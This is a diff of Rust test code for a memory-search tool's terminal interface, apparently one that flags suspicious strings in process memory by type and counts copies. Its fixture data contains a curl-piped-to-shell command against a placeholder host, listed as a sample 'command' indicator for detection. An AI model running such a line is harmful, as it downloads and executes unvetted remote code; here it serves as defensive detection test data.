@@ -2037,6 +2037,7 @@ fn memory_search_form_results_and_match_preview_in_split_panes() -> Result<()> {
             skipped: 0,
             next: Some(region.end),
             cancelled: false,
+            strings: None,
         })),
     });
     let buffer = stage.render(stage.started)?;
@@ -2077,7 +2078,9 @@ fn memory_search_form_results_and_match_preview_in_split_panes() -> Result<()> {
 
 #[test]
 fn memory_indicators_list_strings_by_what_they_look_like() -> Result<()> {
-    use borg_core::{ActivityData, Indicator, MemoryHit, MemoryRegion, MemorySearchMode, MemorySearchReport};
+    use borg_core::{
+        ActivityData, Indicator, MemoryHit, MemoryRegion, MemorySearchMode, MemorySearchReport, StringsTally,
+    };
     let mut stage = activity_stage()?;
     stage.send(key(KeyCode::Tab)).send(key(KeyCode::Char('/')));
     stage.state.activity.search_form.as_mut().unwrap().mode = MemorySearchMode::Indicators;
@@ -2094,24 +2097,36 @@ fn memory_indicators_list_strings_by_what_they_look_like() -> Result<()> {
         name: "Heap · application buffers".into(),
         ..Default::default()
     };
+    // Ranked as a search ranks them: only in memory ahead of what a file holds too.
     let found = [
-        (0x40, "ASCII", Indicator::Url, "https://updates.example.com/v2/check"),
-        (0x1c0, "ASCII", Indicator::Command, "/bin/sh -c 'curl -s https://cdn.example.net/x | sh'"),
-        (0x400, "UTF-16LE", Indicator::Path, "/home/me/shop/config/settings.toml"),
-        (0x9a0, "ASCII", Indicator::Ip, "listening on 10.0.0.5:8080"),
-        (0x1200, "ASCII", Indicator::Secret, "token=shop-test-0000-not-a-real-token"),
+        (0x1200, Indicator::Secret, "token=shop-test-0000-not-a-real-token", 1, false),
+        (0x1c0, Indicator::Command, "/bin/sh -c 'curl -s https://cdn.example.net/x | sh'", 1, false),
+        (0x40, Indicator::Url, "https://updates.example.com/v2/check", 3, false),
+        (0x9a0, Indicator::Ip, "listening on 10.0.0.5:8080", 1, false),
+        (0x400, Indicator::Path, "/home/me/shop/config/settings.toml", 12, true),
     ];
     let hits = found
-        .into_iter()
-        .map(|(offset, encoding, indicator, text)| MemoryHit {
+        .iter()
+        .map(|&(offset, indicator, text, copies, in_file)| MemoryHit {
             address: region.start + offset,
             length: text.len(),
-            encoding: encoding.into(),
+            encoding: "ASCII".into(),
             region: region.clone(),
             text: Some(text.into()),
             indicator: Some(indicator),
+            copies,
+            places: (0..copies.min(2)).map(|copy| (region.start + offset + copy * 0x8000, 0)).collect(),
+            in_file: Some(in_file),
         })
         .collect();
+    let strings = StringsTally {
+        found: 18,
+        distinct: 5,
+        kinds: found.iter().map(|&(_, kind, ..)| (kind, 1)).collect(),
+        memory_only: 4,
+        files: 23,
+        regions: vec![region.clone()],
+    };
     stage.send(Msg::Activity {
         id,
         result: Ok(ActivityData::Search(MemorySearchReport {
@@ -2122,10 +2137,12 @@ fn memory_indicators_list_strings_by_what_they_look_like() -> Result<()> {
             skipped: 0,
             next: None,
             cancelled: false,
+            strings: Some(strings),
         })),
     });
     let buffer = stage.render(stage.started)?;
-    ensure_text(&buffer, "command  /bin/sh -c")?;
+    ensure_text(&buffer, "• /bin/sh -c")?;
+    ensure_text(&buffer, "C Next copy")?;
     check("memory_indicators", &stage, buffer)
 }
 
